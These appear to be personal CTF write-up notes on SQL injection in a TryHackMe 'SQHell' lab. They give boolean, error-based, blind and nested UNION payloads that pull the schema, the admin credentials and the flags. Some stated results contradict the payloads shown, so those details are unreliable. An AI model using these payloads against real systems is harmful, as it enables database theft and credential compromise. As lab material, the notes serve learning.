
#public: true

http://taget.xyz/user?id=1

GET /user?id=1

found boolean sqli :

http://taget.xyz/user?id=1 or 1=1--



![]()
http://taget.xyz/user?id=1 or 1=1#

# commenting is also working.

Now found number of columns in the query :

http://taget.xyz/user?id=1 or 1=1 order by 1#

http://taget.xyz/user?id=1 or 1=1 order by 2#

http://taget.xyz/user?id=1 or 1=1 order by 3#

![file://C:/Users/BINGOW~1/AppData/Local/Temp/.QJS3P3/2.png](file://C:/Users/BINGOW~1/AppData/Local/Temp/.QJS3P3/2.png)

http://taget.xyz/user?id=1 or 1=1 order by 4#

![file://C:/Users/BINGOW~1/AppData/Local/Temp/.QJS3P3/3.png](file://C:/Users/BINGOW~1/AppData/Local/Temp/.QJS3P3/3.png)

got different response when order by 4 is injected.

means there are 3 columns in the query.

**Select all 3 columns with union :**

http://taget.xyz/user?id=1 or 1=1 union select 1,2,3#

other columns are not displayed in the page.

**Findout the datatype of all the 3 columns**

[http://target.xyz/user?id=1](http://target.xyz/user?id=1) or 1=1 union select 'a', null, null#

[http://target.xyz/user?id=1](http://target.xyz/user?id=1) or 1=1 union select 'a', 'a', null#

[http://target.xyz/user?id=1](http://target.xyz/user?id=1) or 1=1 union select 'a', 'a', 'a'#

getting response for the payloads, means all 3 columns types is vachar or text type.

find the db server name:

[http://target.xyz/user?id=1](http://target.xyz/user?id=1) and (select substring(version(),1,1)) > '0'#

MySQL 8.0.2

find current database:

[http://target.xyz/user?id=1](http://target.xyz/user?id=1) and substring(database(),1,1) > 'm'#

sqhell_4

find how many tables in the database sqhell_4 :

[http://target.xyz/user?id=1](http://target.xyz/user?id=1) AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='sqhell_4')=1

got response, means 1 table.

find length of table name first:

[http://target.xyz/user?id=1](http://target.xyz/user?id=1) AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_4' LIMIT 0,1))=5#

got reseponse, means column name is of 5 characters length.

Extract Table Name Characters:

-- ASCII 102 = 'f'

-- LIMIT 0,1 = first table

-- LIMIT 1,1 = second table

-- LIMIT 2,1 = third table

In SQL, `LIMIT offset, count` means:

**Syntax:** **`LIMIT offset, count`**

| Statement  | Offset (skip)  | Count (take)   | Result  |
| ---------- | -------------- | -------------- | ------- |
| LIMIT 0, 1 | 0 rows skipped | 1 row returned | 1st row |
| LIMIT 1, 1 | 1 row skipped  | 1 row returned | 2nd row |
| LIMIT 2, 1 | 2 rows skipped | 1 row returned | 3rd row |
| LIMIT 3, 1 | 3 rows skipped | 1 row returned | 4th row |

[http://target.xyz/user?id=1](http://target.xyz/user?id=1) AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_4' LIMIT 0,1),1,1))=65#

after fuzzing, found first character as u (may be users)

confirm :

[http://target.xyz/user?id=1](http://target.xyz/user?id=1) AND (SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_4' LIMIT 0,1)='users'#

got the response, confirmed.

**find columns from users table:**

1. find total columns in the users table:

[http://target.xyz/user?id=1](http://target.xyz/user?id=1) AND (select count(*) from information_schema.columns where table_name='users' and table_schema='sqhell_4')=3#

got response, means 3 columns in the users table.

1. find 3 column names from the users table.

2.1 find column length of first column:

[http://target.xyz/user?](http://target.xyz/user?id=1)id=1 AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='sqhell_4' LIMIT 0,1))=2#

1st column length: 2

2.2 find column length of second column:

[http://target.xyz/user?](http://target.xyz/user?id=1)id=1 AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='sqhell_4' LIMIT 1,1))=8#

2nd column length: 8

2.3 find column length of third column:

[http://target.xyz/user?](http://target.xyz/user?id=1)id=1 AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='sqhell_4' LIMIT 2,1))=8#

3rd column length: 8

2.4 extract 1st column name from users table:

[http://target.xyz/user?](http://target.xyz/user?id=1)id=1 AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='sqhell_4' LIMIT 0,1),1,1))=105# -- ASCII 105 = 'i'

id

2.5 extract 2nd column name from users table:

[http://target.xyz/user?](http://target.xyz/user?id=1)id=1 AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='sqhell_4' LIMIT 1,1),1,1))=105#

username

2.6 extract 3rd column name from users table:

[http://target.xyz/user?](http://target.xyz/user?id=1)id=1 AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='sqhell_4' LIMIT 2,1),1,1))=105#

password

2.7 find the total rows in the users table:

[http://target.xyz/user?id](http://target.xyz/user?id=1)[=](http://target.xyz/user?id=1)[1](http://target.xyz/user?id=1) AND (SELECT count(*) FROM users)=1#

total rows in the users table : 1

3.1 find length of username value from users table:

[http://target.xyz/user?id](http://target.xyz/user?id=1)[=](http://target.xyz/user?id=1)[1](http://target.xyz/user?id=1) AND LENGTH((SELECT username FROM users LIMIT 0,1))=1#

username length: 5

3.2 extract username valiue from the users table:

[http://target.xyz/user?id](http://target.xyz/user?id=1)[=](http://target.xyz/user?id=1)[1](http://target.xyz/user?id=1) AND ASCII(SUBSTRING((SELECT username from users LIMIT 0,1),1,1))=1#

admin

3.3 get length of password column of admin username:

[http://target.xyz/user?id](http://target.xyz/user?id=1)[=](http://target.xyz/user?id=1)[1](http://target.xyz/user?id=1) AND LENGTH((SELECT password FROM users WHERE username='admin'))=1#

password length: 8

3.4 extract password value from the users table for admin user:

[http://target.xyz/user?id](http://target.xyz/user?id=1)[=](http://target.xyz/user?id=1)[1](http://target.xyz/user?id=1) AND ASCII(SUBSTRING((SELECT password from users where username='admin' LIMIT 0,1),1,1))=1#

password

=====================

http://taget.xyz/post?id=1

GET /post?id=1

test for error based:

[http://taget.xyz/post?id=1'](http://taget.xyz/post?id=1')

confirmed!

http://taget.xyz/post?id=1 or 1=1#

Now found number of columns in the query :

[http://taget.xyz/post?id=1](http://taget.xyz/post?id=1) order by 4#

4 columns in the query.

**Select all 4 columns with union :**

http://taget.xyz/post?id=1 or 1=1 union select 1,2,3,4#

http://taget.xyz/post?id=1 union select 1,2,3,4#

other columns are not displayed in the page.

**Findout the datatype of all the 3 columns**

[http://target.xyz/post?id=1](http://target.xyz/post?id=1) or 1=1 union select 'a', null, null, null#

[http://target.xyz/post?id=1](http://target.xyz/user?id=1) or 1=1 union select 'a', 'a', null, null#

[http://target.xyz/post?id=1](http://target.xyz/user?id=1) or 1=1 union select 'a', 'a', 'a', null#

[http://target.xyz/post?id=1](http://target.xyz/user?id=1) or 1=1 union select 'a', 'a', 'a', 'a'#

getting response for the payloads, means all 4 columns types is vachar or text type.

find the db server name:

[http://target.xyz/post?id=1](http://target.xyz/user?id=1) and (select substring(version(),1,1)) > '0'#

[http://target.xyz/post?id=1](http://target.xyz/user?id=1) and (select substring(version(),1,1)) = '8'#

MySQL 8.0.2

find current database:

[http://target.xyz/post?id=1](http://target.xyz/user?id=1) and substring(database(),1,1) > 'm'#

[http://target.xyz/post?id=1](http://target.xyz/user?id=1) and substring(database(),1,1) = 's'#

[http://target.xyz/post?id=1](http://target.xyz/user?id=1) and substring(database(),2,1) = 'q'#

sqhell_5

find how many tables in the database sqhell_4 :

[http://target.xyz/post?id=1](http://target.xyz/user?id=1) AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='sqhell_5')=1#

got response, means 3 table.

find length of 1st table name:

[http://target.xyz/post?id=1](http://target.xyz/user?id=1) AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_5' LIMIT 0,1))=5#

got response, means table name is of 4 characters length.

find length of 2nd table name:

[http://target.xyz/post?id=1](http://target.xyz/user?id=1) AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_5' LIMIT 1,1))=5#

got reseponse, means table name is of 5 characters length.

find length of 3rd table name:

[http://target.xyz/post?id=1](http://target.xyz/user?id=1) AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_5' LIMIT 2,1))=5#

got reseponse, means table name is of 5 characters length.

======================================================

http://taget.com/register/user-check?username=testuser

GET /register/user-check?username=testuser

background query possible : select * from users where username = '<input>'

since admin is already an existing user, when checking for admin I get:

![file://C:/Users/BINGOW~1/AppData/Local/Temp/.QJS3P3/4.png](file://C:/Users/BINGOW~1/AppData/Local/Temp/.QJS3P3/4.png)

now try boolean injection:

http://target.com/register/user-check?username=admin' and 1=1#

**true**(admin) and **true**(1=1), then result is **true**. So available user is **false**.

![file://C:/Users/BINGOW~1/AppData/Local/Temp/.QJS3P3/5.png](file://C:/Users/BINGOW~1/AppData/Local/Temp/.QJS3P3/5.png)

lets try:

**true**(admin) and **false**(1=2), then result is **false**, So available user is **true**.

![file://C:/Users/BINGOW~1/AppData/Local/Temp/.QJS3P3/6.png](file://C:/Users/BINGOW~1/AppData/Local/Temp/.QJS3P3/6.png)

Hence it is vulnerable to SQL Injection.

so here, based on the condition we get available variable as true or false.

**Now found number of columns in the query :**

http://target.com/register/user-check?username=admin' and 1=1 order by 1#

http://target.com/register/user-check?username=admin' and 1=1 order by 2#

http://target.com/register/user-check?username=admin' and 1=1 order by 3#

![file://C:/Users/BINGOW~1/AppData/Local/Temp/.QJS3P3/7.png](file://C:/Users/BINGOW~1/AppData/Local/Temp/.QJS3P3/7.png)

http://target.com/register/user-check?username=admin' and 1=1 order by 4#

![file://C:/Users/BINGOW~1/AppData/Local/Temp/.QJS3P3/8.png](file://C:/Users/BINGOW~1/AppData/Local/Temp/.QJS3P3/8.png)

got available as **true**, for the order by 4. means there are totally 3 columns in the query.

3 columns in the query.

**Select all 3 columns with union :**

http://target.com/register/user-check?username=admin' and 1=1 union select 1,2,3#

columns are not returned in the query, just true and false is returned based on the query condition.

**Findout the datatype of all the 3 columns**

http://target.com/register/user-check?username=admin' and 1=1 union select 'a', null, null#

http://target.com/register/user-check?username=admin' or 1=1 union select 'a', 'a', null#

http://target.com/register/user-check?username=admin' or 1=1 union select 'a', 'a', 'a'#

getting response as **false**, for the payloads, means all 3 columns types is vachar or text type.

**find the db server name:**

http://target.com/register/user-check?username=admin' and (select substring(version(),1,1)) > '0'#

http://target.com/register/user-check?username=admin' and (select substring(version(),1,1)) = '8'#

MySQL 8.0.2

**find current database:**

http://target.com/register/user-check?username=admin' and substring(database(),1,1) > 'm'#

http://target.com/register/user-check?username=admin' and substring(database(),1,1) = 's'#

http://target.com/register/user-check?username=admin' and substring(database(),2,1) = 'q'#

sqhell_3

**find how many tables in the database sqhell_3 :**

http://target.com/register/user-check?username=admin' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='sqhell_3')=2#

got response as **false**, means 2 table.

find length of 1st table name:

http://target.com/register/user-check?username=admin' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_3' LIMIT 0,1))=5#

got reseponse, means table name is of 4 characters length.

find length of 2nd table name:

http://target.com/register/user-check?username=admin' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_3' LIMIT 1,1))=5#

got reseponse, means table name is of 5 characters length.

Extract Table Name Characters:

-- ASCII 102 = 'f'

-- LIMIT 0,1 = first table

-- LIMIT 1,1 = second table

http://target.com/register/user-check?username=admin' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_3' LIMIT 0,1),1,1))=65#

(or)

http://target.com/register/user-check?username=admin' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_3' LIMIT 0,1),1,1)='f'#

http://target.com/register/user-check?username=admin' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_3' LIMIT 0,1),2,1)='l'#

http://target.com/register/user-check?username=admin' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_3' LIMIT 0,1),3,1)='a'#

http://target.com/register/user-check?username=admin' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_3' LIMIT 0,1),4,1)='g'#

Table 1 Name: flag

http://target.com/register/user-check?username=admin' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_3' LIMIT 1,1),1,1)='u'#

http://target.com/register/user-check?username=admin' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_3' LIMIT 1,1),2,1)='s'#

http://target.com/register/user-check?username=admin' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_3' LIMIT 1,1),3,1)='e'#

http://target.com/register/user-check?username=admin' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_3' LIMIT 1,1),4,1)='r'#

http://target.com/register/user-check?username=admin' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='sqhell_3' LIMIT 1,1),4,1)='s'#

Table 2 Name: users

**find columns from flag table:**

1. find total columns in the flag table:

http://target.com/register/user-check?username=admin' AND (select count(*) from information_schema.columns where table_name='flag' and table_schema='sqhell_3')=2#

got response, means 2 columns in the flag table.

1. find 2 column names from the flag table.

2.1 find column length of first column:

http://target.com/register/user-check?username=admin' AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='flag' AND table_schema='sqhell_3' LIMIT 0,1))=4#

1st column length: 4

2.2 find column length of second column:

http://target.com/register/user-check?username=admin' AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='flag' AND table_schema='sqhell_3' LIMIT 1,1))=2#

2nd column length: 2

2.3 extract 1st column name from flag table:

http://target.com/register/user-check?username=admin' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flag' AND table_schema='sqhell_3' LIMIT 0,1),1,1)='f'#

f

http://target.com/register/user-check?username=admin' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flag' AND table_schema='sqhell_3' LIMIT 0,1),2,1)='l'#

l

http://target.com/register/user-check?username=admin' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flag' AND table_schema='sqhell_3' LIMIT 0,1),3,1)='a'#

a

http://target.com/register/user-check?username=admin' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flag' AND table_schema='sqhell_3' LIMIT 0,1),4,1)='g'#

g

1st column name is "flag"

2.4 extract 2nd column name from flag table:

http://target.com/register/user-check?username=admin' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flag' AND table_schema='sqhell_3' LIMIT 1,1),1,1)='i'#

i

http://target.com/register/user-check?username=admin' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flag' AND table_schema='sqhell_3' LIMIT 1,1),2,1)='a'#

d

2nd column anme is "id"

2.5 find the total rows in the flag table:

http://target.com/register/user-check?username=admin' AND (SELECT count(*) FROM flag)=1#

total rows in the flag table : 1

3.1 find length of flag value from flag table:

http://target.com/register/user-check?username=admin' AND LENGTH((SELECT flag FROM flag LIMIT 0,1))=1#

flag length: 43

3.2 extract flag value from the flag table:

http://target.com/register/user-check?username=admin' AND SUBSTRING((SELECT flag from flag LIMIT 0,1),1,1)='FUZZ'#

THM{flag3:97Aeb3b28A4864416718f3A5fAf8F308}







flag4 : 
http://target.xyz/user?id=1 
payload: 
```
select * from users where id = 1 and 1=2 UNION ALL SELECT '1 UNION ALL SELECT 1, flag, 3, 4 from flag-- -' , 2, 3 from sqhell_4.users LIMIT 0,1
```

```
select * from users where id = 3333 UNION SELECT '1 UNION SELECT 1, flag, 3, 4 from flag', 2, 3
```

```
select * from users where id = 3333 UNION '1 UNION SELECT '
```

select * from users where id = 1
user_id = 1
username = admin
select * from posts where user_id = {user_id}
posts = [{....}, {...}]-> displayed in UI. 


select * from users where id = 1 and 1=2 UNION SELECT '1 UNION SELECT flag,2,3,4 FROM flag#', 'b', 'c'#

find the count of columns in the 2nd query: 
select * from users where id=1 and 1=2 UNION SELECT '1 order by 1--',2,3#
select * from users where id=1 and 1=2 UNION SELECT '1 order by 2--',2,3#
select * from users where id=1 and 1=2 UNION SELECT '1 order by 3--',2,3#
select * from users where id=1 and 1=2 UNION SELECT '1 order by 4--',2,3#
so total 4 columns are there in 2nd query. 

find the datatype of the 4columns of the 2nd query: 
1 and 1=2 UNION SELECT "1 AND 1=2 UNION select 'a', null, null,null--",2,3#
1 and 1=2 UNION SELECT "1 AND 1=2 UNION select 'a', 'b', null, null--", 2,3#
1 and 1=2 UNION SELECT "1 AND 1=2 UNION select 'a', 'b', 'c', null--", 2,3#
1 and 1=2 UNION SELECT "1 AND 1=2 UNION select 'a', 'b', 'c', 'd'--", 2,3#

all 4 columns of 2nd query are of varchar or text datatype. 
column 1 and 2 of 2nd query are reflected in the UI. 

find out the database through 2nd query: 
1 and 1=2 UNION SELECT "1 AND 1=2 UNION select 'a', database(), 'c', 'd'--", 2,3#
database : sqhell_4 

find number of tables in the sqhell_4 database through 2nd query. 
```
1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='sqhell_4')=1#

1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='sqhell_4')=2#
```
```
1 and 1=2 UNION SELECT "1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='sqhell_4')=3#", 2,3#
total tables: 3 

1 and 1=2 UNION SELECT "1 and 1=2 UNION SELECT 'a',COUNT(*),'c','d' FROM information_schema.tables WHERE table_schema='sqhell_4'--", 2,3#
total tables: 3
```
total 3 tables are there in the sqhell_4 database in the context of the 2nd query. 

find table1 name through 2nd query: 
```
1 and 1=2 UNION SELECT "1 and 1=2 UNION SELECT 'a',table_name,'c','d' FROM information_schema.tables WHERE table_schema='sqhell_4' LIMIT 0,1--", 2,3#
table-1 name: flag

1 and 1=2 UNION SELECT "1 and 1=2 UNION SELECT 'a',table_name,'c','d' FROM information_schema.tables WHERE table_schema='sqhell_4' LIMIT 1,1--", 2,3#
table-2 name: posts

1 and 1=2 UNION SELECT "1 and 1=2 UNION SELECT 'a',table_name,'c','d' FROM information_schema.tables WHERE table_schema='sqhell_4' LIMIT 2,1--", 2,3#
table-3 name: users
```

find total columns in the flag table:
```
1 and 1=2 UNION select "1 and 1=2 UNION ALL select 'a',count(*),'c','d' FROM information_schema.columns where table_name='flag' and table_schema='sqhell_4'#", 2,3#
```
total columns in the flag table = 2 

find the column names of the flag table through the 2nd query: 
```
1 and 1=2 UNION select "1 and 1=2 UNION ALL select 'a',column_name,'c','d' FROM information_schema.columns where table_name='flag' and table_schema='sqhell_4' LIMIT 0,1#", 2,3#
```
column-1 : flag

```
1 and 1=2 UNION select "1 and 1=2 UNION ALL select 'a',column_name,'c','d' FROM information_schema.columns where table_name='flag' and table_schema='sqhell_4' LIMIT 1,1#", 2,3#
```
column-2 : id


fetch flag value from flag table:
```
1 and 1=2 UNION select "1 and 1=2 UNION ALL select 'a',flag,'c','d' FROM flag LIMIT 0,1#", 2,3#
```
flag value : THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}

